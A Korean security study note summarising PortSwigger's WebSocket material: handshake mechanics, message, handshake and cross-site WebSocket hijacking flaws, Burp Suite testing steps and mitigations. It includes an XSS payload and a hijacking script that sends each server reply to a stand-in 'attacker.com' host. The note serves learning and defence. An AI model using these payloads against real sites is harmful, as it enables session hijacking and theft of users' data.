+++
date = '2026-07-30T18:00:00+09:00'
draft = false
title = '[Note] PortSwigger - WebSocket 토픽 정리 및 실습'
summary = "WebSocket의 동작 방식과 핸드셰이크 구조, 메시지·핸드셰이크·CSWSH로 나뉘는 취약점 유형, Burp를 이용한 트래픽 조작 진단 방법과 대응 방안을 정리한 자료"
toc = true
tags = ["WebSocket", "CSWSH", "PortSwigger"]
+++

---

## 들어가며

WebSocket은 실시간 채팅, 알림, 시세 스트리밍처럼 낮은 지연과 서버 주도 메시지가 필요한 기능에서 널리 사용되는 통신 프로토콜이다.  
HTTP로 시작해 연결을 업그레이드한 뒤 양방향으로 오래 유지되는 통신 채널을 만든다는 점이 특징이며, 이 구조 때문에 진단 관점에서도 일반적인 HTTP 요청과는 다른 접근이 필요하다.

이 글에서는 WebSocket의 동작 방식과 핸드셰이크 구조, 취약점이 발생하는 지점, Burp를 이용한 트래픽 조작 방법, 그리고 대응 방안을 정리한다.  
유형별 Lab 풀이는 별도의 Write-up으로 정리했으며, 본문 마지막에서 연결한다.

![image.png](/note/4/image.png)
*https://portswigger.net/web-security*

---

## WebSocket이란?

WebSocket은 HTTP를 통해 시작되는 양방향(bi-directional) 전이중(full duplex) 통신 프로토콜이다.  
연결이 한 번 수립되면 계속 열린 상태로 유지되고, 클라이언트와 서버 어느 쪽이든 원하는 시점에 메시지를 보낼 수 있다.

HTTP와의 차이를 정리하면 다음과 같다.

| 구분        | HTTP                                | WebSocket                              |
| ----------- | ----------------------------------- | -------------------------------------- |
| 연결 수명   | 요청·응답 후 종료                    | 수립 후 지속 유지                       |
| 통신 방향   | 클라이언트 요청 → 서버 응답          | 양방향, 서버가 먼저 보낼 수 있음        |
| 메시지 성격 | 트랜잭션(요청 1건에 응답 1건)        | 비트랜잭션, 순서·짝이 정해지지 않음     |
| 주요 용도   | 문서·API 요청                        | 실시간 스트리밍, 서버 주도 알림         |

클라이언트에서 연결을 수립할 때는 다음과 같이 JavaScript를 사용한다.

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

`wss` 는 TLS로 암호화된 WebSocket이고, `ws` 는 암호화되지 않은 평문 통신이다. HTTP와 HTTPS의 관계와 같으므로 항상 `wss` 를 사용해야 한다.

---

## WebSocket 핸드셰이크

WebSocket 연결은 HTTP 요청으로 시작해, 서버가 프로토콜 전환에 동의하면 지속 연결로 업그레이드된다.

클라이언트가 보내는 핸드셰이크 요청은 다음과 같다.

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

서버가 전환을 수락하면 `101 Switching Protocols` 로 응답한다.

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

각 헤더의 역할은 다음과 같다.

| 헤더                     | 역할                                                                 |
| ------------------------ | -------------------------------------------------------------------- |
| `Connection: Upgrade`    | 연결을 다른 프로토콜로 전환하겠다는 요청                              |
| `Upgrade: websocket`     | 전환 대상 프로토콜을 WebSocket으로 지정                               |
| `Sec-WebSocket-Version`  | 사용할 WebSocket 프로토콜 버전(현재 13)                               |
| `Sec-WebSocket-Key`      | 클라이언트가 생성한 랜덤 값                                          |
| `Sec-WebSocket-Accept`   | 위 키를 규격에 따라 변환한 값으로, 응답이 정상적인 핸드셰이크임을 확인 |

여기서 주의할 점은 `Sec-WebSocket-Key` 와 `Sec-WebSocket-Accept` 가 **인증이나 보안을 위한 값이 아니라는 것**이다. 캐시나 WebSocket을 모르는 서버가 응답을 잘못 처리하는 상황을 걸러내기 위한 값이며, 예측 불가능성을 이용한 CSRF 방어 역할은 하지 않는다.

진단 관점에서 더 중요한 것은 **인증과 세션이 핸드셰이크 시점에 결정된다는 점**이다. 이후 주고받는 메시지에는 쿠키나 인증 헤더가 다시 실리지 않고, 핸드셰이크에서 확정된 컨텍스트에서 처리된다. 즉 핸드셰이크 요청 하나가 이후 연결 전체의 권한을 결정하므로, 핸드셰이크 자체가 독립적인 공격면이 된다.

---

## WebSocket 메시지

연결이 수립되면 양쪽은 자유롭게 메시지를 주고받는다. 클라이언트에서 메시지를 보낼 때는 다음과 같이 사용한다.

```javascript
ws.send("Peter Wiener");
```

실제 애플리케이션에서는 단순 문자열보다 JSON 같은 구조화된 형식을 사용하는 경우가 많다.

```json
{"user":"Hal Pline","content":"I wanted to be a Playstation growing up..."}
```

내용은 임의의 형식을 가질 수 있으며, 프레임 단위로 전송된다는 점 외에는 HTTP 본문과 다르지 않다. 따라서 메시지에 담긴 사용자 입력 역시 신뢰할 수 없는 데이터로 취급해야 한다.

---

## WebSocket에서 발생하는 취약점

원칙적으로 HTTP에서 발생하는 거의 모든 웹 취약점은 WebSocket 통신에서도 발생할 수 있다. 발생 지점을 기준으로 정리하면 크게 세 가지로 나뉜다.

| 유형             | 발생 지점                    | 대표 사례                                        |
| ---------------- | ---------------------------- | ------------------------------------------------ |
| 메시지 기반      | 메시지에 담긴 사용자 입력     | XSS, SQL Injection, XXE 등 입력 기반 취약점       |
| 핸드셰이크 설계 결함 | 핸드셰이크 요청의 헤더·세션 처리 | 헤더 기반 보안 결정 우회, 세션 처리 결함          |
| CSWSH            | 핸드셰이크의 CSRF 취약점       | 피해자 세션으로 연결 수립 후 데이터 유출·행위 수행 |

### 메시지 기반 취약점

메시지로 전달된 입력이 서버에서 안전하지 않게 처리되면 SQL Injection이나 XXE 같은 서버 측 취약점으로 이어진다. 응답이 관측되지 않는 Blind 형태라면 OAST(Out-of-band) 기법으로 확인할 수 있다.

반대로 서버가 메시지를 다른 사용자에게 중계하는 구조라면, 공격자가 보낸 데이터가 다른 사용자의 브라우저에서 처리되면서 XSS 같은 클라이언트 측 취약점이 발생한다. 채팅 기능이 대표적이다.

```json
{"message":"Hello Carlos"}
```

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

여기서 특히 주의해야 할 점은 **검증과 인코딩이 클라이언트 측 스크립트에서만 수행되는 경우**다. 브라우저의 입력창을 거치는 값은 인코딩되더라도, WebSocket 메시지는 프록시에서 직접 만들어 보낼 수 있으므로 그 처리는 방어로 기능하지 못한다.

### 핸드셰이크 설계 결함

핸드셰이크 단계에서 비롯되는 문제는 주로 다음과 같다.

- **HTTP 헤더를 근거로 한 보안 결정**: `X-Forwarded-For` 처럼 클라이언트가 임의로 넣을 수 있는 헤더로 IP를 판단하면, IP 기반 차단이나 접근 제어가 그대로 우회된다.
- **세션 처리 결함**: 메시지가 처리되는 컨텍스트는 핸드셰이크에서 확정되므로, 이 시점의 세션 처리에 결함이 있으면 연결 전체의 권한 판단이 틀어진다.
- **커스텀 헤더로 넓어진 공격면**: 애플리케이션이 핸드셰이크에서 사용하는 커스텀 헤더 역시 조작 가능한 입력이다.

### Cross-Site WebSocket Hijacking

핸드셰이크에 CSRF 취약점이 있을 때 발생하는 공격으로, 뒤에서 따로 정리한다.

---

## Cross-Site WebSocket Hijacking(CSWSH)

CSWSH는 WebSocket 핸드셰이크에 존재하는 CSRF 취약점을 악용하는 공격이다.  
핸드셰이크가 세션 처리를 HTTP 쿠키에만 의존하고 CSRF 토큰이나 그 밖의 예측 불가능한 값을 포함하지 않을 때 성립한다.

전제가 되는 특성은 두 가지다. 하나는 브라우저가 WebSocket 연결에는 동일 출처 정책을 강제하지 않고 `Origin` 헤더만 전달하므로, 교차 출처 차단 여부가 서버의 검증에 달려 있다는 점이다. 다른 하나는 핸드셰이크가 결국 HTTP 요청이므로 쿠키가 자동으로 첨부된다는 점이다.

공격 흐름은 다음과 같다.

1. 공격자가 자신이 제어하는 페이지에서 대상 애플리케이션의 WebSocket 엔드포인트로 연결을 수립한다.
2. 브라우저가 피해자의 세션 쿠키를 첨부하므로, 연결은 피해자 세션으로 수립된다.
3. 공격자는 피해자를 대신해 임의의 메시지를 전송한다.
4. 연결이 양방향이므로 서버가 돌려주는 응답까지 읽어 외부로 유출한다.

```html
<script>
    websocket = new WebSocket('wss://vulnerable-website.com/chat');
    websocket.onopen = function () {
        websocket.send("READY");
    };
    websocket.onmessage = function (event) {
        fetch('https://attacker.com/?' + event.data, {mode: 'no-cors'});
    };
</script>
```

일반적인 CSRF는 요청을 보낼 수 있을 뿐 응답을 읽지 못하는 경우가 많다. 반면 CSWSH는 지속되는 양방향 채널을 획득하므로, 권한 있는 행위 수행과 민감 데이터 열람을 모두 수행할 수 있다는 점이 결정적인 차이다.

---

## WebSocket 트래픽 조작

WebSocket 진단은 메시지를 가로채 수정하고 재전송하는 것에서 시작한다. Burp Suite를 기준으로 정리하면 다음과 같다.

### 메시지 가로채기와 수정

Burp의 브라우저로 대상 기능을 사용하면 Proxy의 **WebSockets history** 탭에 주고받은 메시지가 기록된다. Intercept를 켜면 메시지를 전달 전에 확인하고 수정할 수 있다.  
클라이언트→서버 방향과 서버→클라이언트 방향 중 어느 쪽을 가로챌지는 Settings의 WebSocket interception rules에서 설정한다.

### 메시지 재전송과 생성

WebSockets history나 Intercept 탭에서 메시지를 선택해 **Send to Repeater** 하면, 수정한 메시지를 반복 전송할 수 있다. 서버 방향뿐 아니라 클라이언트 방향으로 새 메시지를 만들어 보내는 것도 가능하며, History 패널에서 이전 메시지를 다시 편집해 전송할 수도 있다.

### 핸드셰이크 조작

Repeater에서 WebSocket URL 옆의 연필 아이콘을 누르면 새 연결을 수립하거나(connect), 기존 연결을 복제·재연결(clone·reconnect)할 수 있으며, 이때 핸드셰이크 요청을 직접 편집할 수 있다.  
핸드셰이크를 다시 만들어야 하는 상황은 대체로 다음과 같다.

- 헤더 조작 등으로 공격면을 넓혀야 할 때
- 공격 시도로 연결이 끊겨 재연결이 필요할 때
- 만료된 토큰이나 인증 데이터를 갱신해야 할 때

### 진단 시 확인할 항목

- 클라이언트 측 스크립트에서만 인코딩·검증하고 있는지 (프록시에서 원문 전송으로 확인)
- 서버가 메시지를 다른 사용자에게 중계하는지, 수신 측이 어떤 방식으로 DOM에 삽입하는지
- 핸드셰이크의 헤더를 근거로 보안 결정을 내리는지 (`X-Forwarded-For` 등)
- 핸드셰이크에 CSRF 토큰이 있는지, 서버가 `Origin` 을 검증하는지
- 세션 쿠키의 `SameSite` 속성 설정

---

## 대응 방안

- **`wss://` 프로토콜 사용**: WebSocket 통신을 TLS로 보호해 평문 노출과 중간자 조작을 막는다.
- **엔드포인트 URL 하드코딩**: WebSocket 엔드포인트 주소를 코드에 고정하고, 사용자가 제어 가능한 데이터를 URL에 포함시키지 않는다.
- **핸드셰이크의 CSRF 방어**: 핸드셰이크에 예측 불가능한 토큰을 포함시키고, 서버에서 `Origin` 헤더를 허용 목록과 비교해 검증하며, 세션 쿠키에 `SameSite` 를 적용해 CSWSH를 차단한다.
- **양방향 데이터를 모두 불신**: WebSocket으로 수신한 데이터는 방향에 상관없이 신뢰할 수 없는 입력으로 취급하고, 서버와 클라이언트 양쪽에서 안전하게 처리해 SQL Injection이나 XSS 같은 입력 기반 취약점을 방지한다.

핵심은 두 가지다. 첫째, **클라이언트 측 인코딩은 방어가 아니다.** 메시지는 프록시에서 얼마든지 조작할 수 있으므로 검증과 인코딩은 반드시 서버와 수신 측에서 수행해야 한다.  
둘째, **핸드셰이크를 하나의 보안 경계로 다뤄야 한다.** 연결 이후의 모든 권한이 이 요청에서 결정되므로, 메시지 단위 방어만으로는 충분하지 않다.

---

## 실습

PortSwigger Web Security Academy의 WebSocket 랩을 유형별로 풀어 정리했다.  
각 랩의 상세 풀이는 Write-up으로 별도 정리했으며, 아래는 유형별 개요다.

| 유형                    | 대표 Lab                                                | 난이도       |
| ----------------------- | ------------------------------------------------------- | ------------ |
| 메시지 조작 (XSS)       | Manipulating WebSocket messages to exploit vulnerabilities | APPRENTICE   |
| CSWSH                   | Cross-site WebSocket hijacking                          | PRACTITIONER |
| 핸드셰이크 조작 (필터·IP 차단 우회) | Manipulating the WebSocket handshake to exploit vulnerabilities | PRACTITIONER |

전체 풀이는 [WebSocket Write-up 아카이브](/write-up/portswigger/websocket/)에서 확인할 수 있다.

---

## 마치며

이 글에서는 WebSocket의 동작 방식과 핸드셰이크 구조, 메시지·핸드셰이크·CSWSH로 나뉘는 취약점 유형, Burp를 이용한 트래픽 조작 방법과 대응 방안을 정리했다.

WebSocket은 새로운 취약점을 만들어내는 프로토콜이 아니라, 기존 웹 취약점이 다른 경로로 드러나는 통로에 가깝다. XSS나 SQL Injection 같은 익숙한 취약점이 요청 파라미터가 아닌 메시지를 통해 발생하고, CSRF는 핸드셰이크를 노려 CSWSH가 된다.

그래서 진단에서 중요한 것은 프로토콜의 특성을 이해하는 것이다. 메시지는 프록시에서 직접 조작할 수 있으므로 클라이언트 측 처리는 방어로 세지 않고, 연결 전체의 권한은 핸드셰이크 한 번에 결정되므로 핸드셰이크를 다시 만들어보는 시도가 필요하다.  
이 글이 WebSocket을 학습하거나 진단을 준비하는 과정에서 하나의 참고 자료로 활용되기를 바란다.

---

> 참고자료  
> https://portswigger.net/web-security/websockets  
> https://portswigger.net/web-security/websockets/what-are-websockets  
> https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking  
> https://portswigger.net/burp/documentation/desktop/testing-workflow/websockets
